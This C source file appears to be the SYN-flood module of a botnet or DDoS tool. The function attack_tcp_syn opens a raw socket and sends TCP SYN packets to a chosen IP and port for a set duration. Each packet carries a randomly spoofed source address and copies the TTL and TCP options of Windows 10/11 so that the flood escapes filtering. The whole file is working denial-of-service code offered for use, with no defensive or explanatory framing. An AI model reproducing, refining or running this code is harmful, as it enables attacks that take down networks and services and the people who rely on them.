#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <time.h>

#include "attack.h"

struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

// Advanced SYN Flood
// - Uses Fast PRNG
// - Mimics Windows 10/11 TCP Stack (Window Size, Options)
// - Dynamic Spoofing
void attack_tcp_syn(uint32_t ip, uint16_t port, uint32_t duration) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) return;

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = ip;

    char packet[4096];
    struct ip *iph = (struct ip *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct ip));
    struct pseudo_header psh;

    time_t end_time = time(NULL) + duration;

    // Pre-calculate minimal IP Header fields
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 0;
    iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr) + 20; // +20 bytes options (5 words)
    iph->ip_id = htonl(54321);
    iph->ip_off = 0;
    iph->ip_ttl = 128; // Windows TTL
    iph->ip_p = IPPROTO_TCP;
    iph->ip_dst.s_addr = ip;

    while (time(NULL) < end_time) {
        // High-performance IP generation
        // Bias towards public ranges? For now pure random.
        iph->ip_src.s_addr = fast_rand(); 
        iph->ip_id = htonl(fast_rand() & 0xFFFF);
        iph->ip_sum = 0;
        iph->ip_sum = csum((unsigned short *)packet, iph->ip_len);

        tcph->th_sport = htons(fast_rand() & 0xFFFF);
        tcph->th_dport = htons(port);
        tcph->th_seq = fast_rand();
        tcph->th_ack = 0;
        tcph->th_off = 10; // 5 (header) + 5 (options) = 10 words (40 bytes)
        tcph->th_flags = TH_SYN;
        tcph->th_win = htons(65535); // Max Window
        tcph->th_sum = 0;
        tcph->th_urp = 0;

        // Realistic TCP Options (Windows style)
        // 1. MSS (Kind 2, Len 4, Val 1460)
        // 2. NOP (Kind 1)
        // 3. Window Scale (Kind 3, Len 3, Val 8)
        // 4. NOP (Kind 1)
        // 5. NOP (Kind 1)
        // 6. SACK Permitted (Kind 4, Len 2)
        uint8_t *opts = (uint8_t *)(packet + sizeof(struct ip) + sizeof(struct tcphdr));
        
        // MSS: 1460 (0x05b4)
        opts[0] = 2; opts[1] = 4; opts[2] = 0x05; opts[3] = 0xb4;
        
        // NOP
        opts[4] = 1;
        
        // Window Scale: 8
        opts[5] = 3; opts[6] = 3; opts[7] = 8;
        
        // NOPs
        opts[8] = 1; opts[9] = 1;
        
        // SACK Permitted
        opts[10] = 4; opts[11] = 2;

        // End of Options List (EOL not strictly needed if alignment matches off)
        // We used 12 bytes. Need 8 more to reach 20? 
        // Logic: 20 bytes options requested (ip_len). 
        // Currently: 4+1+3+2+2 = 12. 
        // Adding Timestamp? (Kind 8, Len 10) -> 22 bytes? Check offset.
        // Let's stick to 12 bytes options and adjust offset.
        // 12 bytes = 3 words. th_off = 5 + 3 = 8.
        iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr) + 12;
        tcph->th_off = 8;

        psh.source_address = iph->ip_src.s_addr;
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr) + 12);

        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + 12;
        // Optimization: Don't malloc/free every loop. Use stack buffer.
        char pseudogram[512]; 
        memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + 12);
        
        tcph->th_sum = csum((unsigned short*)pseudogram, psize);

        sendto(sock, packet, iph->ip_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    }
    close(sock);
}
